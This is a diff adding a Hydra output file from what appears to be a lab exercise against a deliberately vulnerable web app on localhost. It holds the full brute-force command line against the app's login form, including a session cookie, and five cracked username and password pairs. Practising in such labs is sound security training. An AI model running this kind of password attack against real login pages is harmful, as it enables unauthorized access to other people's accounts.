@@ -1,0 +1,6 @@
+# Hydra v9.5 run at 2025-09-28 22:22:50 on localhost http-get-form (hydra -vV -o resultados_finales.txt -L users.txt -P passwords.txt http-get-form://localhost:5000/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=fuf157c9r1gfgir2cjuvg40o84; security=low:F=Username and/or password incorrect)
+[5000][http-get-form] host: localhost   login: admin   password: password
+[5000][http-get-form] host: localhost   login: pablo   password: letmein
+[5000][http-get-form] host: localhost   login: smithy   password: password
+[5000][http-get-form] host: localhost   login: 1337   password: charley
+[5000][http-get-form] host: localhost   login: gordonb   password: abc123
